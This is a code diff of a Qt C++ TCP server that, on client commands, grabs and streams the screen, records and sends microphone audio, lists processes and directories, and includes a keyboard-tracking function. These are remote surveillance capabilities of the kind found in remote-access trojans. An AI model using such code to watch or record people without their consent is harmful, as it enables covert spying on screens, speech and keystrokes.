@@ -197,21 +197,20 @@ void Server::sendMessage(QTcpSocket* sender, const QString &msg)
     sender->write(block);
 }
 
-void Server::sendScreenshot(QTcpSocket* sender, const QPixmap &screenshot) {
-    QPixmap resizedScreenshot = screenshot.scaled(800, 800, Qt::KeepAspectRatio, Qt::SmoothTransformation);
+void Server::sendScreenshot(QTcpSocket* sender, const QPixmap &screenshot, QString type) {
+//    QPixmap resizedScreenshot = screenshot.scaled(800, 800, Qt::KeepAspectRatio, Qt::SmoothTransformation);
 
     QByteArray block;
     QDataStream out(&block, QIODevice::WriteOnly);
     out.setVersion(QDataStream::Qt_6_5);
 
-//    out << tr("image") << screenshot;
-//    curClient->write(block);
     QByteArray byteArray;
     QBuffer buffer(&byteArray);
     buffer.open(QIODevice::WriteOnly);
-    resizedScreenshot.save(&buffer, "PNG");
-    out << tr("image") << byteArray;
+    screenshot.save(&buffer, "JPEG");
+    out << type << byteArray;
     sender->write(block);
+    qDebug() << "image sent to client";
 }
 
 void Server::sendFileStructure(QTcpSocket* sender, const QStringList &fileStruct)
@@ -244,22 +243,14 @@ void Server::send_audio_file(QTcpSocket* sender){
     out << tr("audio") << mydata;
     sender->write(mydata);
     qDebug() << "audio sent";
-    QTimer::singleShot(5000, this, [=]() {
-        QFile file1("D:\\recorded_data.m4a");
-        file1.setPermissions(QFileDevice::WriteUser | QFileDevice::ReadUser | QFileDevice::ExeUser);
-        if (file1.exists() && file1.remove()) {
-            qDebug() << "Audio file deleted on the server";
-        } else {
-            qDebug() << "Failed to delete audio file on the server";
-        }
-    });
+    file.close();
 }
 void Server::readMessage() {
     QTcpSocket *clientConnection = static_cast<QTcpSocket*>(sender());
     if (clientConnection != nullptr) {
         qDebug() << "read message client connection not null";
     }
-    qDebug() << "A message just got to server!";
+
 
     in.setDevice(clientConnection);
     in.setVersion(QDataStream::Qt_6_5);
@@ -267,6 +258,8 @@ void Server::readMessage() {
 
     QString message;
     in >> message;
+
+    qDebug() << "A message just got to server: " << message;
 
     if (!in.commitTransaction())
         return;
@@ -315,15 +308,24 @@ void Server::readMessage() {
     }
     else if (message == tr("take screenshot")) {
         qDebug() << "taken screenshot";
-//        QPixmap screenshot = QGuiApplication::primaryScreen()->grabWindow(0);
-////        emit(display(screenshot));
-//        sendScreenshot(screenshot);
-        QTimer *timer = new QTimer;
+        QPixmap screenshot = QGuiApplication::primaryScreen()->grabWindow(0);
+        sendScreenshot(clientConnection, screenshot, tr("image"));
+
+    }
+    else if (message == tr("stream screen")){
+        qDebug() << "streaming screen";
+        timer = new QTimer;
         connect(timer, &QTimer::timeout, this, [=]() {
             stream(clientConnection);
         });
-        timer->start();
-        QTimer::singleShot(3000, timer, &QTimer::stop);
+        timer->start(200);
+//        QTimer::singleShot(3000, timer, &QTimer::stop);
+    }
+    else if (message == tr("stop_stream")){
+        timer->stop();
+        delete timer;
+        timer = nullptr;
+        //        QTimer::singleShot(3000, timer, &QTimer::stop);
     }
     else if (message == tr("show directories")) {
         qDebug() << "show directories";
@@ -345,8 +347,6 @@ void Server::readMessage() {
         recorder = nullptr;
 
         send_audio_file(clientConnection);
-
-
     }
     else if (message == "ls") {
         //        QString dirPath = args.size() > 1 ? args[1] : ".";
@@ -364,8 +364,7 @@ void Server::readMessage() {
 
 void Server::stream(QTcpSocket* clientConnection) {
     QPixmap screenshot = QGuiApplication::primaryScreen()->grabWindow(0);
-    //        emit(display(screenshot));
-    sendScreenshot(clientConnection, screenshot);
+    sendScreenshot(clientConnection, screenshot, tr("stream"));
 }
 
 void Server::sendKeyboardTrack(QTcpSocket* clientSocket) {
@@ -393,7 +392,6 @@ void Server::sendProcesses(QTcpSocket* clientSocket) {
 
     out << tr("list processes") << lines;
     clientSocket->write(block);
-//    sendMessage(clientSocket, tr("huhu"));
 }
 
 void Server::newConnection() {
